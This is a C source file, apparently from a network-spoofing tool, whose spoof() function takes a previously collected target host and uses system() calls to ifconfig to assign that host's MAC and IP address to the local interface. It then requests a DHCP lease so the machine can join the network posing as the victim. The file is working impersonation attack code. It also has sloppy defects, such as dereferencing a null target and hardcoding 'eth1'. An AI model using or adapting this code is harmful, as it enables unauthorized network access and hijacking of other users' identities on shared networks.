#include"pul.h"

int spoof(struct puldb* mydb)
{
	// TODO something nicer than calls to system() ...

	struct puldbnode* current;
	current=mydb->head; // need to make this point someplace better
	if(current==0)
	{
		fprintf(stderr,"**  error: no targets collected yet\n");
	}

	int target;
	printf("target: ");
	scanf("%d",&target);
	
	// traverse to the proper node
	for(;target>1;--target)
	{
		if(current)
		{
			current=current->next;
		}
		else 
		{
			fprintf(stderr,"**  error: target isnt in list\n");
			return 0;
		}
	}
	
	char buffer[100];
	
	printf("**  bringing down interface..\n");

	sprintf(buffer,"ifconfig %s down",mydb->interface);
	system(buffer);
	
	// spoof MAC address
	printf("**  spoofing mac..\n");
	sprintf(buffer,"ifconfig eth1 hw ether %02x%02x%02x%02x%02x%02x",
			current->mac[0],current->mac[1],current->mac[2],current->mac[3],current->mac[4],current->mac[5]);

	system(buffer);
	
	// spoof IP address
	printf("**  setting ip to %hi.%hi.%hi.%hi..\n",
			current->ip[0],current->ip[1],current->ip[2],current->ip[3]);
	sprintf(buffer,"ifconfig eth1 up %hi.%hi.%hi.%hi",
			current->ip[0],current->ip[1],current->ip[2],current->ip[3]);
	system(buffer);
	

	// :-) this will work for notcat, but not much else :-)
	sprintf(buffer,"pump -i %s",mydb->interface);
	fprintf(stderr,"**  connecting to network");
	system(buffer);
	
	/*
	resolvegw(mydb);
	
	printf("**  setting gateway\n");

	//printf("arp -s pulroute %02x%02x%02x%02x%02x%02x\n",mydb->gateway[0],mydb->gateway[1],mydb->gateway[2],mydb->gateway[3],mydb->gateway[4],mydb->gateway[5]);
	//sprintf(buffer,"arp -s pulroute %02x%02x%02x%02x%02x%02x",
	//mydb->gateway[0],mydb->gateway[1],mydb->gateway[2],mydb->gateway[3],mydb->gateway[4],mydb->gateway[5]);

	//system(buffer);
	//system("route add default gw pulroute");
	
	sprintf(buffer,"route add default gw %hi.%hi.%hi.%hi",
		mydb->gatewayip[0],mydb->gatewayip[1],mydb->gatewayip[2],mydb->gatewayip[3]);
	system(buffer);
	*/
}
